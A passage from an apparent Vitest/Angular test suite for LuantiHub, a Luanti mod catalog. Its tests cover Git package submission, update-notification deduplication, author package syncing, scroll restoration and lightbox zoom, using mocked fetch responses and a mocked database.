      globalThis.fetch = vi.fn(async (input: any) => {
        const url = typeof input === 'string' ? input : input?.url || '';
        if (url === 'https://cheapiesystems.com/git/celevator/plain/mod.conf') {
          return new Response(
            `name = celevator\ntitle = C-Elevator\ndescription = """\nRealistic elevators for Luanti.\nIncludes controllers and dispatchers.\n"""\nlicense = Unlicense\nmin_minetest_version = 5.6.0\nmax_minetest_version = 5.11.0\nsupported_games = minetest_game, mesecons_game\ntags = transport, technology\n`,
            { status: 200 }
          );
        }
        if (url === 'https://cheapiesystems.com/git/celevator/plain/init.lua') {
          return new Response(
            `local modname = core.get_current_modname()\ncore.log("action", "[" .. modname .. "] loaded")\n`,
            { status: 200 }
          );
        }
        if (url.includes('/packages/?fmt=vcs')) {
          return new Response(
            JSON.stringify([
              {
                author: 'cheapie',
                name: 'celevator',
                title: 'C-Elevator',
                type: 'mod',
                repo: celevatorUrl,
                downloads: 4200,
                tags: ['transport', 'technology']
              }
            ]),
            { status: 200, headers: { 'Content-Type': 'application/json' } }
          );
        }
        return new Response('Not Found', { status: 404 });
      }) as any;

      const mockDb = {
        prepare: (sql: string) => ({
          bind: (..._args: any[]) => ({
            first: async () => {
              if (sql.includes('FROM users WHERE id =')) {
                return { id: 'user-cheapie', username: 'cheapie', display_name: 'cheapie' };
              }
              return null;
            },
            all: async () => {
              if (sql.includes('FROM user_identities WHERE user_id =')) {
                return {
                  results: [{ provider: 'contentdb', username: 'cheapie', verified: 1 }]
                };
              }
              return { results: [] };
            },
            run: async () => ({ meta: { changes: 1 } })
          }),
          all: async () => ({ results: [] }),
          run: async () => ({ meta: { changes: 1 } })
        })
      };

      const req = new Request('https://luantihub.org/api/packages/git', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Cookie: `lh_session=${sessionCookie}`
        },
        body: JSON.stringify({
          repoUrl: celevatorUrl,
          dryRun: true,
          warrantiesAccepted: true
        })
      });

      const res = await gitOnRequestPost({
        request: req,
        env: { DB: mockDb, SESSION_SECRET: 'test-secret' }
      });
      expect(res.status).toBe(200);
      const body: any = await res.json();
      expect(body.success).toBe(true);
      expect(body.canPublish).toBe(true);
      expect(body.ownershipVerified).toBe(true);
      expect(body.package.short_desc).toContain('Realistic elevators for Luanti.');
      expect(body.package.short_desc).not.toBe('"""');
      expect(body.package.max_minetest_version).toBe('5.11.0');
      expect(body.package.supported_games).toEqual(['minetest_game', 'mesecons_game']);

      // Verify SubmitModalComponent auto-preselects matching catalog tags on dryRun audit
      const fixture = TestBed.createComponent(SubmitModalComponent);
      const comp = fixture.componentInstance;
      const authService = TestBed.inject(AuthService);
      const pkgService = TestBed.inject(PackageService);
      (authService as any)._currentUser.set({
        id: 'user-cheapie',
        username: 'cheapie',
        display_name: 'cheapie',
        avatar_url: 'logo.svg',
        identities: [{ provider: 'contentdb', username: 'cheapie', verified: true }]
      });
      (pkgService as any)._availableTags.set([
        { name: 'transport', title: 'Transport' },
        { name: 'technology', title: 'Technology' },
        { name: 'magic', title: 'Magic' }
      ]);
      vi.spyOn(pkgService, 'auditOrSubmitGitPackage').mockResolvedValue({
        success: true,
        audit: body.audit
      });

      comp.repoUrl = celevatorUrl;
      await comp.onRunAudit();
      expect(comp.selectedTags()).toEqual(['transport', 'technology']);
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('should deduplicate LuantiHub Updated OS notifications across checkManifestBundleChanged, SwUpdate VERSION_READY, and Service Worker LH_APP_UPDATE_DETECTED', async () => {
    const { Subject } = await import('rxjs');
    const {
      extractNgswBundleSignature,
      buildAppUpdateRelatedTags,
      mergeNotificationPersistenceStates
    } = await import('./core/utils/notification-engine');

    // 1. Verify unified manifest signature parser supports hyphens/underscores in bundle hashes and produces canonical versionKey + related tags
    const sampleManifest = {
      timestamp: 1794003200000,
      appData: { buildTimestamp: 1794003200000 },
      assetGroups: [
        {
          name: 'app',
          urls: ['/index.html', '/main-AB_CD-12.js', '/styles-EF_GH-34.css']
        }
      ],
      hashTable: {
        '/index.html': 'idxhash999',
        '/custom-sw.js': 'swhash888',
        '/main-AB_CD-12.js': 'mainhash777',
        '/styles-EF_GH-34.css': 'stylehash666'
      }
    };
    const parsed = extractNgswBundleSignature(sampleManifest);
    expect(parsed).toBeTruthy();
    expect(parsed?.versionKey).toBe('main-AB_CD-12.js');
    expect(parsed?.signature).toBe(
      '/main-AB_CD-12.js|/styles-EF_GH-34.css|idxhash999|swhash888|1794003200000'
    );
    const related = buildAppUpdateRelatedTags(parsed!.versionKey, parsed);
    expect(related).toContain('lh-app-update-main-AB_CD-12.js');
    expect(related).toContain('lh-app-update-styles-EF_GH-34.css');
    expect(related).toContain('lh-app-update-1794003200000');
    expect(related).toContain(
      `lh-app-update-${parsed!.signature.slice(0, 48)}`
    );

    // 2. Verify mergeNotificationPersistenceStates preserves newer bootManifestSignature by build timestamp and max lastAppUpdateNotifiedAt
    const mergedState = mergeNotificationPersistenceStates(
      {
        seenTags: ['lh-app-update-old'],
        bootManifestSignature: '/main-OLD.js|/styles-OLD.css|h1|s1|1794000000000',
        lastAppUpdateNotifiedAt: 1000
      },
      {
        seenTags: ['lh-app-update-main-AB_CD-12.js'],
        bootManifestSignature: parsed!.signature,
        lastAppUpdateNotifiedAt: 5000
      }
    );
    expect(mergedState.bootManifestSignature).toBe(parsed!.signature);
    expect(mergedState.lastAppUpdateNotifiedAt).toBe(5000);

    // 3. Verify that when checkManifestBundleChanged fires "LuantiHub Updated" first, a subsequent SwUpdate VERSION_READY event (~1m later with 40-char SHA1 hash) does NOT fire a duplicate notification
    const pwaService = TestBed.inject(PwaService);
    const settingsService = TestBed.inject(SettingsService);
    const versionUpdates$ = new Subject<any>();
    const activateUpdateSpy = vi.fn().mockResolvedValue(true);
    const reloadSpy = vi.spyOn(pwaService, 'reloadWindow').mockImplementation(() => {});
    const sendNotifSpy = vi.spyOn(pwaService, 'sendNativeNotification');
    const origSwUpdate = (pwaService as any).swUpdate;

    try {
      settingsService.notificationsEnabled.set(true);
      settingsService.notifyAppUpdates.set(true);
      (pwaService as any).bootManifestSignature =
        '/main-OLD000.js|/styles-OLD000.css|oldidx|oldsw|1794000000000';
      (pwaService as any).updateAvailable.set(false);
      (pwaService as any).appUpdateNotifiedInSession = false;

      globalThis.fetch = vi.fn().mockResolvedValue({
        ok: true,
        json: async () => sampleManifest
      }) as unknown as typeof fetch;

      (pwaService as any).swUpdate = {
        isEnabled: true,
        versionUpdates: versionUpdates$.asObservable(),
        activateUpdate: activateUpdateSpy,
        checkForUpdate: vi.fn().mockResolvedValue(false)
      };
      (pwaService as any).initSwUpdate();

      // Trigger background manifest check -> detects main-AB_CD-12.js and fires notification #1
      const detected = await pwaService.checkForUpdate(false);
      expect(detected).toBe(true);
      const appUpdateCallsAfterPoll = sendNotifSpy.mock.calls.filter(
        c => c[0]?.category === 'app_update'
      );
      expect(appUpdateCallsAfterPoll.length).toBe(1);
      expect(appUpdateCallsAfterPoll[0][0].tag).toBe('lh-app-update-main-AB_CD-12.js');

      // 45 seconds later, Angular SwUpdate finishes verifying assets and emits VERSION_READY with a 40-char SHA-1 hash
      versionUpdates$.next({
        type: 'VERSION_READY',
        currentVersion: { hash: '0000000000000000000000000000000000000000' },
        latestVersion: { hash: 'f5879b723ca05b41b60ef6943e3e3772949f632c' }
      });
      await new Promise(resolve => setTimeout(resolve, 20));

      const appUpdateCallsAfterVersionReady = sendNotifSpy.mock.calls.filter(
        c => c[0]?.category === 'app_update'
      );
      expect(appUpdateCallsAfterVersionReady.length).toBe(1);

      // Even if a BroadcastChannel LH_APP_UPDATE_DETECTED arrives or another notifyAppUpdateAvailable is called with a different version string within cooldown, no 2nd notification fires
      (pwaService as any).notifyAppUpdateAvailable('another-version-hash-within-cooldown');
      const appUpdateCallsFinal = sendNotifSpy.mock.calls.filter(
        c => c[0]?.category === 'app_update'
      );
      expect(appUpdateCallsFinal.length).toBe(1);
    } finally {
      (pwaService as any).swUpdate = origSwUpdate;
      reloadSpy.mockRestore();
      sendNotifSpy.mockRestore();
    }
  });

  it('should advance multi-batch Git sync across >8 packages for registered authors (e.g. TenPlus1) and expose diagnostic status via GET /api/users/:username/sync-contentdb', async () => {
    const {
      syncVerifiedAuthorGitPackages,
      inspectAuthorGitSyncStatus,
      runOneTimeExistingUsersGitBackfill
    } = await import('../../functions/api/lib/author-git-sync');
    const {
      onRequestGet: syncContentDbGet,
      onRequestPost: syncContentDbPost
    } = await import('../../functions/api/users/[username]/sync-contentdb');

    const storedPackages = new Map<string, any>();
    const storedMeta = new Map<string, string>();
    const tenPlusPackages = Array.from({ length: 12 }, (_, idx) => {
      const num = idx + 1;
      const name = `tenplus_mod_${num}`;
      return {
        author: 'TenPlus1',
        name,
        title: `TenPlus Mod ${num}`,
        type: 'mod',
        short_description: `TenPlus1 Mod #${num}`,
        repo: `https://codeberg.org/tenplus1/${name}`,
        downloads: 1000 + num
      };
    });

    const mockDb = {
      prepare: (sql: string) => {
        const execAll = async (args: any[]) => {
          if (sql.includes('SELECT DISTINCT user_id FROM user_identities')) {
            return { results: [{ user_id: 'usr_tenplus1' }] };
          }
          if (sql.includes('FROM user_identities') && sql.includes('WHERE user_id =')) {
            return {
              results: [{ provider: 'contentdb', provider_username: 'TenPlus1', username: 'TenPlus1', verified: 1 }]
            };
          }
          if (sql.includes('FROM packages')) {
            return { results: Array.from(storedPackages.values()) };
          }
          if (sql.includes('FROM moderation_reports')) {
            return { results: [] };
          }
          return { results: [] };
        };
        const execFirst = async (args: any[]) => {
          if (sql.includes('FROM system_metadata WHERE key =')) {
            const k = String(args[0] || '');
            return storedMeta.has(k) ? { value: storedMeta.get(k) } : null;
          }
          if (sql.includes('FROM users WHERE id =')) {
            return { id: 'usr_tenplus1', username: 'TenPlus1', display_name: 'TenPlus1', role: 'user' };
          }
          if (sql.includes('FROM users') && sql.includes('LOWER(username) = LOWER(?)')) {
            return { id: 'usr_tenplus1', username: 'TenPlus1', display_name: 'TenPlus1', role: 'user' };
          }
          if (sql.includes('FROM user_identities WHERE LOWER(provider_username) = LOWER(?)')) {
            return { user_id: 'usr_tenplus1', username: 'TenPlus1' };
          }
          if (sql.includes('SELECT id FROM user_identities WHERE user_id = ?')) {
            return { id: 1 };
          }
          return null;
        };
        const execRun = async (args: any[]) => {
          if (sql.includes('INSERT OR REPLACE INTO system_metadata')) {
            storedMeta.set(String(args[0]), String(args[1]));
          } else if (sql.includes('INSERT INTO packages')) {
            const id = String(args[0]);
            storedPackages.set(id.toLowerCase(), {
              id,
              author_id: String(args[1]),
              author_name: String(args[2]),
              name: String(args[3]),
              title: String(args[4]),
              type: String(args[5]),
              short_desc: String(args[6]),
              long_desc: String(args[7]),
              repo_url: String(args[8]),
              provider: String(args[9]),
              default_branch: String(args[10]),
              latest_commit_sha: args[11],
              thumbnail_url: String(args[12] || ''),
              banner_url: String(args[13] || ''),
              downloads_count: Number(args[15] || 0),
              license: String(args[18] || 'MIT'),
              tags: String(args[20] || '["git","contentdb"]'),
              status: 'active',
              git_repo_status: 'verified'
            });
          }
          return { success: true, meta: { changes: 1 } };
        };

        return {
          bind: (...args: any[]) => ({
            all: () => execAll(args),
            first: () => execFirst(args),
            run: () => execRun(args)
          }),
          all: () => execAll([]),
          first: () => execFirst([]),
          run: () => execRun([])
        };
      }
    };

    const origFetch = globalThis.fetch;
    globalThis.fetch = (async (input: any, init?: any) => {
      const url = typeof input === 'string' ? input : input?.url || '';
      if (url.includes('/api/users/TenPlus1/sync-contentdb')) {
        const method = (init?.method || (typeof input !== 'string' ? input?.method : 'GET') || 'GET').toUpperCase();
        if (method === 'GET') {
          return syncContentDbGet({
            request: new Request(`https://luantihub.org${url.startsWith('/') ? url : `/${url}`}`),
            env: { DB: mockDb },
            params: { username: 'TenPlus1' }
          });
        }
        return syncContentDbPost({
          request: new Request(`https://luantihub.org${url.startsWith('/') ? url : `/${url}`}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: init?.body
          }),
          env: { DB: mockDb },
          params: { username: 'TenPlus1' }
        });
      }
      if (url.includes('/packages/?fmt=vcs')) {
        return new Response(JSON.stringify(tenPlusPackages), {
          status: 200,
          headers: { 'Content-Type': 'application/json' }
        });
      }
      if (url.includes('/users/TenPlus1/')) {
        return new Response(
          JSON.stringify({
            username: 'TenPlus1',
            display_name: 'TenPlus1',
            connections: { forums: 'TenPlus1' }
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      const forgeApiMatch = url.match(/codeberg\.org\/api\/v1\/repos\/tenplus1\/(tenplus_mod_\d+)$/i);
      if (forgeApiMatch) {
        return new Response(
          JSON.stringify({
            default_branch: 'master',
            html_url: `https://codeberg.org/tenplus1/${forgeApiMatch[1]}`
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      const rawConfMatch = url.match(
        /codeberg\.org\/(?:api\/v1\/repos\/)?tenplus1\/(tenplus_mod_\d+)\/raw\/(?:branch\/(?:master|main)\/)?mod\.conf$/i
      );
      if (rawConfMatch) {
        const modName = rawConfMatch[1];
        return new Response(`name = ${modName}\ndescription = Automated test mod ${modName}\n`, {
          status: 200
        });
      }
      return new Response('Not Found', { status: 404 });
    }) as typeof fetch;

    try {
      // Clear cached `/packages/?fmt=vcs` entry from earlier tests in the same isolate so `tenPlusPackages` is loaded
      const { invalidateEdgeCacheKeys } = await import('../../functions/api/lib/upstream');
      await invalidateEdgeCacheKeys(['https://cache.luantihub.internal/upstream-v4:/packages/?fmt=vcs']);

      // 1. Inspect initial diagnostic status via GET /api/users/TenPlus1/sync-contentdb (0 synced, 12 pending)
      const initialDiag = await inspectAuthorGitSyncStatus(
        { DB: mockDb },
        { userId: 'usr_tenplus1', username: 'TenPlus1', authorHandles: ['tenplus1'] }
      );
      expect(initialDiag.isRegistered).toBe(true);
      expect(initialDiag.totalContentDbPackages).toBe(12);
      expect(initialDiag.alreadySyncedCount).toBe(0);
      expect(initialDiag.pendingQueueCount).toBe(12);

      // 2. Run AuthService.syncAuthorGitPackages('TenPlus1') and verify multi-batch pagination imports all 12 packages (8 in batch 0 + 4 in batch 1)
      const authService = TestBed.inject(AuthService);
      authService.isSyncingAuthorGit.set(false);
      const syncSummary = await authService.syncAuthorGitPackages(
        'TenPlus1',
        tenPlusPackages.map(p => `TenPlus1/${p.name}`),
        false
      );
      expect(syncSummary.success).toBe(true);
      expect(syncSummary.syncedCount).toBe(12);
      expect(storedPackages.size).toBe(12);

      // 3. Inspect diagnostic status after sync -> all 12 packages are marked 'synced' and pendingQueueCount is 0
      const finalDiagRes = await syncContentDbGet({
        request: new Request('https://luantihub.org/api/users/TenPlus1/sync-contentdb'),
        env: { DB: mockDb },
        params: { username: 'TenPlus1' }
      });
      expect(finalDiagRes.status).toBe(200);
      const finalDiag = await finalDiagRes.json();
      expect(finalDiag.alreadySyncedCount).toBe(12);
      expect(finalDiag.pendingQueueCount).toBe(0);

      // 4. Verify runOneTimeExistingUsersGitBackfill marks completed=true once all registered users have pendingQueueCount === 0
      const backfillRes = await runOneTimeExistingUsersGitBackfill({ DB: mockDb }, true);
      expect(backfillRes.completed).toBe(true);
      expect(backfillRes.anyRemaining).toBe(false);

      // 5. Verify GET /api/authors/:username (`functions/api/authors/[username].ts`) compiles and returns git_sync status
      const { onRequestGet: authorGet } = await import('../../functions/api/authors/[username]');
      const { deleteEdgeCacheKeys } = await import('../../functions/api/lib/upstream');
      expect(typeof deleteEdgeCacheKeys).toBe('function');
      const authorRes = await authorGet({
        request: new Request('https://luantihub.org/api/authors/TenPlus1'),
        env: { DB: mockDb },
        params: { username: 'TenPlus1' }
      });
      expect(authorRes.status).toBe(200);
      const authorBody = await authorRes.json();
      expect(authorBody.author.username).toBe('TenPlus1');
      expect(authorBody.author.git_sync.alreadySyncedCount).toBe(12);
      expect(authorBody.author.git_sync.pendingQueueCount).toBe(0);
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('should scroll to top when selecting "View All" on Home swimlanes while preserving scroll position on Browser Back (popstate)', async () => {
    const packageService = TestBed.inject(PackageService);
    const scrollCalls: Array<{ top?: number; behavior?: string }> = [];
    const origScrollTo = window.scrollTo;
    let simulatedScrollY = 1850;
    const scrollYDescriptor = Object.getOwnPropertyDescriptor(window, 'scrollY');

    Object.defineProperty(window, 'scrollY', {
      configurable: true,
      get: () => simulatedScrollY
    });
    window.scrollTo = ((optsOrX: any, y?: any) => {
      if (typeof optsOrX === 'object' && optsOrX !== null) {
        if (typeof optsOrX.top === 'number') {
          simulatedScrollY = optsOrX.top;
        }
        scrollCalls.push({ top: optsOrX.top, behavior: optsOrX.behavior });
      } else if (typeof y === 'number') {
        simulatedScrollY = y;
        scrollCalls.push({ top: y });
      }
    }) as typeof window.scrollTo;
    (window.scrollTo as any).__customScrollStub = true;

    try {
      window.history.replaceState({}, '', '/');
      simulatedScrollY = 1850;

      // 1. User clicks "View All" on Standalone Voxel Games (`selectPrimaryNavTab('game')`) while scrolled down at 1850px
      packageService.selectPrimaryNavTab('game');

      expect(simulatedScrollY).toBe(0);
      expect(scrollCalls.some(c => c.top === 0)).toBe(true);
      expect((packageService as any).catalogScrollByUrl.get('/')).toBe(1850);

      // 2. User presses Browser Back (`popstate` returning to `/`) -> scroll position 1850px is restored
      window.history.replaceState({ __lhScrollY: 1850 }, '', '/');
      window.dispatchEvent(new PopStateEvent('popstate', { state: { __lhScrollY: 1850 } }));
      expect(simulatedScrollY).toBe(1850);

      // 3. User clicks "View All" on Essential Mods & Addons (`setTagFilter('technology')`) while at 1420px
      simulatedScrollY = 1420;
      packageService.setTagFilter('technology');
      expect(simulatedScrollY).toBe(0);
      expect((packageService as any).catalogScrollByUrl.get('/')).toBe(1420);

      // 4. Browser Back restores 1420px
      window.history.replaceState({ __lhScrollY: 1420 }, '', '/');
      window.dispatchEvent(new PopStateEvent('popstate', { state: { __lhScrollY: 1420 } }));
      expect(simulatedScrollY).toBe(1420);

      // 5. Filtering from inside an open modal overrides modal-close scroll restoration to 0
      packageService.filterByTagFromModal('building');
      expect(simulatedScrollY).toBe(0);
      expect(packageService.consumeModalCloseScrollOverride()).toBe(0);
      expect(packageService.consumeModalCloseScrollOverride()).toBeNull();
    } finally {
      window.scrollTo = origScrollTo;
      if (scrollYDescriptor) {
        Object.defineProperty(window, 'scrollY', scrollYDescriptor);
      } else {
        Object.defineProperty(window, 'scrollY', { configurable: true, value: 0, writable: true });
      }
    }
  });

  it('should position PackageDetailModalComponent lightbox zoom and close controls below browser/OS native top-right buttons', () => {
    const fixture = TestBed.createComponent(PackageDetailModalComponent);
    const comp = fixture.componentInstance;
    const packageService = TestBed.inject(PackageService);
    const mockPkg = {
      id: 'SaKeL/pixie',
      author: 'SaKeL',
      name: 'pixie',
      title: 'Pixie',
      type: 'mod' as const,
      short_desc: 'Pixie mod',
      thumbnail: 'https://luantihub.org/screenshots/pixie.png',
      banner: 'https://luantihub.org/screenshots/pixie.png',
      screenshots: ['https://luantihub.org/screenshots/pixie.png'],
      score: 5,
      downloads: 100,
      license: 'LGPL-2.1-only',
      source: 'git' as const,
      tags: ['git']
    };
    comp.package = mockPkg;
    packageService.openPackageModal(mockPkg, false);
    fixture.detectChanges();
    comp.openLightbox('https://luantihub.org/screenshots/pixie.png');
    fixture.detectChanges();

    const lightboxDialog = fixture.nativeElement.querySelector('[role="dialog"].z-\\[70\\]') as HTMLElement | null;
    expect(lightboxDialog).toBeTruthy();
    expect(lightboxDialog?.className).toContain('w-screen');
    expect(lightboxDialog?.className).toContain('h-screen');

    const controlsContainer = lightboxDialog!.querySelector('.luanti-wco-no-drag') as HTMLElement | null;
    expect(controlsContainer).toBeTruthy();
    expect(controlsContainer?.className).toContain('top-14');
    expect(controlsContainer?.className).toContain('sm:top-16');
    expect(controlsContainer?.getAttribute('style')).toContain('titlebar-area-height');

    const viewportDiv = lightboxDialog!.querySelector('.overflow-auto') as HTMLElement | null;
    expect(viewportDiv).toBeTruthy();
    expect(viewportDiv?.className).toContain('w-full');
    expect(viewportDiv?.className).toContain('h-full');
    expect(viewportDiv?.className).not.toContain('max-w-6xl');
    expect(viewportDiv?.className).not.toContain('items-center');
    expect(viewportDiv?.className).not.toContain('justify-center');

    const imgEl = viewportDiv!.querySelector('img') as HTMLImageElement | null;
    expect(imgEl).toBeTruthy();
    expect(imgEl?.className).toContain('m-auto');
    expect(imgEl?.className).toContain('max-w-[96vw]');
    expect(imgEl?.className).toContain('max-h-[92vh]');

    // Toggle zoom to 2x and verify full-bleed uncropped scrollable classes + shrink-0 + min magnification width
    comp.toggleLightboxZoom();
    fixture.detectChanges();
    expect(comp.isLightboxZoomed()).toBe(true);
    expect(lightboxDialog?.className).toContain('p-0');
    expect(imgEl?.className).toContain('m-auto');
    expect(imgEl?.className).toContain('shrink-0');
    expect(imgEl?.className).toContain('w-[180vw]');
    expect(imgEl?.className).toContain('sm:w-[160vw]');
    expect(imgEl?.getAttribute('draggable')).toBe('false');
    expect(imgEl?.style.width).toBe('max(200vw, 1600px)');
    expect(imgEl?.style.minWidth).toBe('max(200vw, 1600px)');

    // Simulate click-and-drag panning on the zoomed viewport: should scroll and NOT zoom out on release click
    viewportDiv!.scrollLeft = 100;
    viewportDiv!.scrollTop = 80;
    comp.onLightboxMouseDown(new MouseEvent('mousedown', { button: 0, clientX: 200, clientY: 200 }));
    expect(comp.isLightboxDragging()).toBe(true);
    comp.onLightboxMouseMove(new MouseEvent('mousemove', { clientX: 140, clientY: 150 }));
    expect(viewportDiv!.scrollLeft).toBe(160);
    expect(viewportDiv!.scrollTop).toBe(130);
    comp.onLightboxMouseUp();
    expect(comp.isLightboxDragging()).toBe(false);
    // Subsequent click after drag > 5px is consumed without exiting zoom
    comp.toggleLightboxZoom(new MouseEvent('click'));
    expect(comp.isLightboxZoomed()).toBe(true);

    // Simulate single-finger touch-drag panning on the zoomed viewport: should scroll and ignore synthesized post-touch click
    comp.onLightboxTouchStart({ touches: [{ clientX: 180, clientY: 160 }] } as unknown as TouchEvent);
    comp.onLightboxTouchMove({
      touches: [{ clientX: 120, clientY: 110 }],
      cancelable: true,
      preventDefault: () => {}
    } as unknown as TouchEvent);
    expect(viewportDiv!.scrollLeft).toBe(220);
    expect(viewportDiv!.scrollTop).toBe(180);
    comp.onLightboxTouchEnd({ changedTouches: [{ clientX: 120, clientY: 110 }] } as unknown as TouchEvent);
    comp.toggleLightboxZoom(new MouseEvent('click'));
    expect(comp.isLightboxZoomed()).toBe(true);

    // Clean click without drag exits zoom back to 1x
    comp.toggleLightboxZoom(new MouseEvent('click'));
    expect(comp.isLightboxZoomed()).toBe(false);

    packageService.closePackageModal(false);
  });

  it('should surface newly approved ContentDB packages in Recently Added (even when /packages/?fmt=vcs is stale or on HIT-EDGE) and notify all 4 moderated packages with draft created_at plus one-time self-heal', async () => {
    const { onRequestGet: bootGet } = await import('../../functions/api/packages/index');
    const { invalidateEdgeCacheKeys } = await import('../../functions/api/lib/upstream');
    const { evaluateCatalogNotificationsBatch } = await import('./core/utils/notification-engine');

    const nowMs = Date.now();
    // Simulate draft created_at 2 days BEFORE baselineSeededAt (package waited in ContentDB moderation queue)
    const draftCreatedIso = new Date(nowMs - 48 * 3600 * 1000).toISOString();
    const olderApprovedIso = new Date(nowMs - 6 * 3600 * 1000).toISOString();

    const fourNewlyApproved = [
      {
        author: 'zempik10',
        name: 'block_shapeshifts',
        title: 'Block Shapeshifts',
        type: 'mod',
        short_desc: 'Adds a block shapeshift with many textures. Could be used for prop-hunts.',
        thumbnail: 'https://content.luanti.org/uploads/block_shapeshifts.png',
        downloads: 5,
        release: 40004
      },
      {
        author: 'zempik10',
        name: 'animalia_shapeshifts',
        title: 'Animalia Shapeshifts',
        type: 'mod',
        short_desc: 'Registers Animalia mobs as shapeshifts you can transform into.',
        thumbnail: 'https://content.luanti.org/uploads/animalia_shapeshifts.png',
        downloads: 6,
        release: 40003
      },
      {
        author: 'zempik10',
        name: 'classic_mese_monster_shapeshift',
        title: 'Classic Mese Monster Shapeshift',
        type: 'mod',
        short_desc: 'Registers the classic mese monster as a shapeshift.',
        thumbnail: 'https://content.luanti.org/uploads/classic_mese.png',
        downloads: 4,
        release: 40002
      },
      {
        author: 'Don',
        name: 'myeating',
        title: 'My Eating',
        type: 'mod',
        short_desc: 'Eating Animation',
        thumbnail: 'https://content.luanti.org/uploads/myeating.png',
        downloads: 8,
        release: 40001
      }
    ];

    const baselineUpstream = [
      {
        author: 'Minetest',
        name: 'minetest_game',
        title: 'Minetest Game',
        type: 'game',
        short_desc: 'Default game',
        downloads: 500000,
        release: 39000
      }
    ];

    const origFetch = globalThis.fetch;
    globalThis.fetch = (async (input: any) => {
      const url = typeof input === 'string' ? input : input?.url || '';
      if (url.includes('/packages/?sort=approved_at&order=desc&limit=24&fmt=vcs')) {
        return new Response(JSON.stringify([...fourNewlyApproved, ...baselineUpstream]), {
          status: 200,
          headers: { 'Content-Type': 'application/json' }
        });
      }
      if (url.includes('/packages/?fmt=vcs')) {
        // Simulate 30m cached /packages/?fmt=vcs that does NOT yet contain the 4 newly approved packages!
        return new Response(JSON.stringify(baselineUpstream), {
          status: 200,
          headers: { 'Content-Type': 'application/json' }
        });
      }
      if (url.includes('/tags/')) {
        return new Response(JSON.stringify([]), {
          status: 200,
          headers: { 'Content-Type': 'application/json' }
        });
      }
      for (const pkg of fourNewlyApproved) {
        if (url.includes(`/packages/${pkg.author}/${pkg.name}/`)) {
          return new Response(
            JSON.stringify({
              ...pkg,
              // ContentDB detail API returns the older draft creation timestamp (48h ago), NOT approved_at
              created_at: draftCreatedIso
            }),
            { status: 200, headers: { 'Content-Type': 'application/json' } }
          );
        }
      }
      if (url.includes('/packages/Minetest/minetest_game/')) {
        return new Response(
          JSON.stringify({
            ...baselineUpstream[0],
            created_at: olderApprovedIso
          }),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      return new Response(JSON.stringify([]), {
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      });
    }) as typeof fetch;

    const mockDb = {
      prepare: () => ({
        bind: () => ({
          all: async () => ({ results: [] }),
          first: async () => null,
          run: async () => ({ meta: { changes: 0 } })
        }),
        all: async () => ({ results: [] }),
        first: async () => null,
        run: async () => ({ meta: { changes: 0 } })
      })
    };

    try {
      await invalidateEdgeCacheKeys([
        'https://cache.luantihub.internal/upstream-v4:/packages/?fmt=vcs',
        'https://cache.luantihub.internal/upstream-v4:/packages/?sort=approved_at&order=desc&limit=24&fmt=vcs',
        'https://cache.luantihub.internal/__cdb_approved_seen_v1'
      ]);

      // 1. Edge Worker `/api/packages/?boot=1` includes all 4 newly approved packages in both `recentlyAdded` and `packages`
      // even when `/packages/?fmt=vcs` does not yet contain them, and assigns monotonic approval timestamps newer than `olderApprovedIso`.
      const res = await bootGet({
        request: new Request('https://luantihub.org/api/packages/?boot=1'),
        env: { DB: mockDb }
      });
      expect(res.status).toBe(200);
      const bootBody: any = await res.json();
      expect(Array.isArray(bootBody.recentlyAdded)).toBe(true);
      const recentIds = bootBody.recentlyAdded.map((p: any) => p.id);
      expect(recentIds.slice(0, 4)).toEqual([
        'zempik10/block_shapeshifts',
        'zempik10/animalia_shapeshifts',
        'zempik10/classic_mese_monster_shapeshift',
        'Don/myeating'
      ]);
      const pkgIds = new Set((bootBody.packages || []).map((p: any) => p.id));
      for (const expectedId of recentIds.slice(0, 4)) {
        expect(pkgIds.has(expectedId)).toBe(true);
      }
      // Monotonic suffix floor ensures moderated draft package (`draftCreatedIso` = 48h ago) gets `created_at` >= `olderApprovedIso` (6h ago)
      const myEatingRecent = bootBody.recentlyAdded.find((p: any) => p.id === 'Don/myeating');
      expect(Date.parse(myEatingRecent.created_at)).toBeGreaterThanOrEqual(Date.parse(olderApprovedIso));

      // 2. Notification engine (`evaluateCatalogNotificationsBatch`) notifies all 4 newly approved packages (batch cap 6)
      // even if their raw `created_at` is `draftCreatedIso` (48h before `baselineSeededAt`)
      const rawDraftBootPayload = {
        packages: [
          { ...baselineUpstream[0], id: 'Minetest/minetest_game', created_at: olderApprovedIso },
          ...fourNewlyApproved.map((p) => ({
            ...p,
            id: `${p.author}/${p.name}`,
            created_at: draftCreatedIso
          }))
        ],
        recentlyAdded: [
          ...fourNewlyApproved.map((p) => ({
            ...p,
            id: `${p.author}/${p.name}`,
            created_at: draftCreatedIso
          })),
          { ...baselineUpstream[0], id: 'Minetest/minetest_game', created_at: olderApprovedIso }
        ]
      };

      const evalResult = evaluateCatalogNotificationsBatch(
        rawDraftBootPayload,
        {
          prefs: {
            notificationsEnabled: true,
            notifyNewGitPackages: true
          },
          knownGitPackages: ['Minetest/minetest_game', '__cdb_seeded_v1__'],
          baselineSeededAt: nowMs - 3600 * 1000,
          recentDiscoveredPackages: {}
        },
        nowMs
      );
      expect(evalResult.notifications.length).toBe(4);
      expect(evalResult.notifications.map((n) => n.data?.packageId)).toEqual([
        'zempik10/block_shapeshifts',
        'zempik10/animalia_shapeshifts',
        'zempik10/classic_mese_monster_shapeshift',
        'Don/myeating'
      ]);
      expect(Object.keys(evalResult.stateUpdates.recentDiscoveredPackages || {}).length).toBe(4);

      // 3. One-time self-heal (`__cdb_approval_heal_v1__`) recovers top `recentlyAdded` packages that were previously swallowed
      // into `knownGitPackages` by the draft `created_at` bug without being notified or added to `recentDiscoveredPackages`
      const healedResult = evaluateCatalogNotificationsBatch(
        rawDraftBootPayload,
        {
          prefs: {
            notificationsEnabled: true,
            notifyNewGitPackages: true
          },
          knownGitPackages: [
            'Minetest/minetest_game',
            '__cdb_seeded_v1__',
            'zempik10/block_shapeshifts',
            'zempik10/animalia_shapeshifts',
            'zempik10/classic_mese_monster_shapeshift',
            'Don/myeating'
          ],
